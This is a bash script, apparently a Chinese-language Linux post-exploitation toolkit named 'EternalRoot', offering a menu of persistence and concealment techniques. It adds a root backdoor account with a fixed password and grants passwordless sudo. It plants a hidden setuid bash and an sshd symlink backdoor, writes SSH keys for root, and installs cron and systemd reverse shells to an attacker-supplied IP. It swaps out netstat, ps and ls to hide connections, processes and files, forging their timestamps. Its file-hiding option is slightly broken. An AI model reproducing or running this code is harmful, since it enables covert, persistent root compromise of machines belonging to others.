#!/bin/bash

show() {
    cat <<EOF

███████╗████████╗███████╗██████╗ ███╗   ██╗ █████╗ ██╗     ██████╗  ██████╗  ██████╗ ████████╗    
██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██║     ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    
█████╗     ██║   █████╗  ██████╔╝██╔██╗ ██║███████║██║     ██████╔╝██║   ██║██║   ██║   ██║       
██╔══╝     ██║   ██╔══╝  ██╔══██╗██║╚██╗██║██╔══██║██║     ██╔══██╗██║   ██║██║   ██║   ██║       
███████╗   ██║   ███████╗██║  ██║██║ ╚████║██║  ██║███████╗██║  ██║╚██████╔╝╚██████╔╝   ██║       
╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝       
                                                                                                     
请选择维持方式：
    [1] 添加后门账户
    [2] 为账户添加sudo权限
    [3] 隐藏bash命令
    [4] 软链sshd后门
    [5] crontab反向Shell
    [6] 写入公钥
    [7] 持久化反向Shell
    [8] 隐藏网络连接
    [9] 隐藏进程
    [10] 隐藏文件列表
EOF
}

bDoorAdd() {
    local user=$1
    if id "$user" &>/dev/null; then
        echo "${user}账号已经存在"
    else
        echo "${user}:advwtv/9yU5yQ:0:0:,,,:/root:/bin/bash" >> /etc/passwd
        if tail -n 1 /etc/passwd | grep -q "${user}"; then
            echo "添加成功，用户名为${user}，密码为：password@123"
        else
            echo "添加失败"
        fi
    fi
}

sudoAdd() {
    local user=$1
    if id "$user" &>/dev/null; then
        echo "${user} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
        if tail -n 1 /etc/sudoers | grep -q "${user}"; then
            echo "添加成功，用户名为${user}"
        else
            echo "添加失败"
        fi
    else
        echo "账号不存在"
    fi
}

hideBash() {
    if [[ ! -f /tmp/.access_1og ]]; then
        cp /bin/bash /tmp/.access_1og && chmod 4755 /tmp/.access_1og
        touch -r /bin/bash /tmp/.access_1og
        chattr +i /tmp/.access_1og
        if [[ -f /tmp/.access_1og ]]; then
            echo "添加成功，文件名为/tmp/.access_1og"
            echo "使用方法./tmp/.access_1og -p"
        else
            echo "添加失败"
        fi
    else
        echo "文件已经存在"
    fi
}

checkPort() {
    netstat -anpt | grep ":$2 " &>/dev/null
    return $?
}

softLink() {
    local port=$1
    if ! checkPort "$port"; then
        ln -sf /usr/sbin/sshd /tmp/.su
        /tmp/.su -oPort="$port"
        if checkPort "$port"; then
            echo "${port}端口sshd服务开启成功"
            echo "建议使用ssh隐身登录：ssh -T root@ip -p ${port}"
        else
            echo "启动失败"
        fi
    else
        echo "端口被占用"
    fi
}


HiddenNetWork() {
    local ip=$1
    local netstat_path="/usr/bin/netstat"
    local backup_path="/tmp/systemd-private-d9dcbaeaf86da111505d46788a46c600-systemd-logind.service-OV93KA"
    local backup_file="${backup_path}/.netstat_bak"
    local hidden_ips_file="${backup_path}/.hidden_ips"

    # 创建备份目录
    mkdir -p "$backup_path"

     # 判断 netstat_bak 文件是否存在
    if [[ ! -f $backup_file ]]; then
        # 备份 netstat
        cp "$netstat_path" "$backup_path/.netstat" && cp "$netstat_path" "$backup_file" || {
            echo "错误: 备份 netstat 失败"
            return 1
        }
    else
        echo "警告: netstat 文件已存在，跳过备份"
    fi

    # 删除原 netstat 文件
    rm -f "$netstat_path"

    # 将新的 IP 添加到隐藏列表
    echo "$ip" >> "$hidden_ips_file"

    # 创建新的 netstat 文件
    {
        echo '#!/bin/bash'
        echo "${backup_path}/.netstat \$@ | grep -v -f '$hidden_ips_file' | grep -v ${backup_path}"
    } > "$netstat_path"

    # 设置权限
    chmod +x "$netstat_path" || {
        echo "错误: 设置权限失败"
        return 1
    }
    # 设置时间戳
    touch -acmr "${backup_file}" "${netstat_path}"
}


HiddenProcess() {
    local process=$1
    local ps_path="/usr/bin/ps"
    local backup_path="/tmp/systemd-private-ac43860b634e3487c1014a86a9f19130-systemd-logind.service-eUT6QD"
    local backup_file="${backup_path}/.ps_bak"
    local hidden_processes_file="${backup_path}/.hidden_processes"


    # 创建备份目录
    mkdir -p "$backup_path"

    # 判断 ps_bak 文件是否存在
    if [[ ! -f $backup_file ]]; then
        # 备份 ps
        cp "$ps_path" "$backup_path/.ps" && cp "$ps_path" "$backup_file" || {
            echo "错误: 备份 ps 失败"
            return 1
        }
    else
        echo "警告: ps 文件已存在，跳过备份"
    fi

    # 删除原 ps 文件
    rm -f "$ps_path"

    # 将新的进程添加到隐藏列表
    echo "$process" >> "$hidden_processes_file"

    # 创建新的 ps 文件
    {
        echo '#!/bin/bash'
        echo "${backup_path}/.ps \$@ | grep -v -f '$hidden_processes_file' | grep -v $backup_path | grep -v '/bin/bash /usr/bin/ps'"
    } > "$ps_path"

    # 设置权限
    chmod +x "$ps_path" || {
        echo "错误: 设置权限失败"
        return 1
    }
        # 设置时间戳
        touch -acmr "${backup_file}" "${ps_path}"
}

HiddenList() {
    local ls=$1
    local ls_path="/usr/bin/ls"
    local backup_path="/tmp/systemd-private-fb0395f727eb720da7edcf5ca4ca7744-systemd-logind.service-5OCADV"
    local backup_file="${backup_path}/.ls_bak"
    local hidden_processes_file="${backup_path}/.hidden_list"


    # 创建备份目录
    mkdir -p "$backup_path"

    # 判断 ls_bak 文件是否存在
    if [[ ! -f $backup_file ]]; then
        # 备份 ls
        cp "$ls_path" "$backup_path/.ls" && cp "$ls_path" "$backup_file" || {
            echo "错误: 备份 ls 失败"
            return 1
        }
    else
        echo "警告: ls 文件已存在，跳过备份"
    fi

    # 删除原 ls 文件
    rm -f "$ls_path"

    # 将新的进程添加到隐藏列表
    echo "$process" >> "$hidden_processes_file"

    # 创建新的 ls 文件
    {
        echo '#!/bin/bash'
        echo "${backup_path}/.ls  \$@ | grep -v -f '$hidden_processes_file' | grep -v $backup_path "
    } > "$ls_path"

    # 设置权限
    chmod +x "$ls_path" || {
        echo "错误: 设置权限失败"
        return 1
    }
        # 设置时间戳
    touch -acmr "${backup_file}" "${ls_path}"
}


Timing() {
    local ip=$1
    local port=$2
    (crontab -l 2>/dev/null; echo "*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/${ip}/${port} 0>&1'") | crontab -
}

Pub() {
    if [[ -f ./id_rsa.pub ]]; then
        cat id_rsa.pub >> /root/.ssh/authorized_keys
        if [[ $? -eq 0 ]]; then
            echo "公钥已写入"
        else
            echo "写入失败"
        fi
    else
        echo "请先上传公钥到当前目录"
    fi
}

persistShellWithSystemd() {
    local ip=$1
    local port=$2
    local service_content=$(cat <<EOF
[Unit]
Description=Persistent Reverse Shell

[Service]
ExecStart=/bin/bash -c 'while true; do /bin/bash -i >& /dev/tcp/${ip}/${port} 0>&1; sleep 10; done'
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
)
    echo "${service_content}" > /etc/systemd/system/reverse_shell.service
    systemctl daemon-reload
    systemctl enable reverse_shell.service
    systemctl start reverse_shell.service
    if systemctl is-active --quiet reverse_shell.service; then
        echo "反向Shell已持久化并通过systemd启动"
        echo "systemctl start/status/stop reverse_shell.service"
    else
        echo "反向Shell持久化失败，服务未启动成功"
    fi
}

show
read -p "序号：" choice
case $choice in
    1)
        read -p "请输入添加账号名：" user
        bDoorAdd "$user"
        ;;
    2)
        read -p "请输入添加账户名：" user
        sudoAdd "$user"
        ;;
    3)
        hideBash
        ;;
    4)
        while true; do
            read -p "希望开放端口：" port
            if ! checkPort "$port"; then
                softLink "$port"
                break
            else
                echo "端口被占用"
            fi
        done
        ;;
    5)
        read -p "请输入ip：" ip
        read -p "请输入端口号：" port
        Timing "$ip" "$port"
        ;;
    6)
        Pub
        ;;
    7)
        read -p "请输入ip:" ip
        read -p "请输入端口:" port
        persistShellWithSystemd "$ip" "$port"
        ;;
    8)
     	read -p "请输入ip或字符串:" ip
     	HiddenNetWork "$ip"
     	;;
    9)
        read -p "请输入进程名:" process
        HiddenProcess "$process"
        ;;
    10)
        read -p "请输入要隐藏的文件夹或文件:" process
        HiddenList "$ls"
        ;;
    *)
        echo "无效的序号"
        ;;
esac
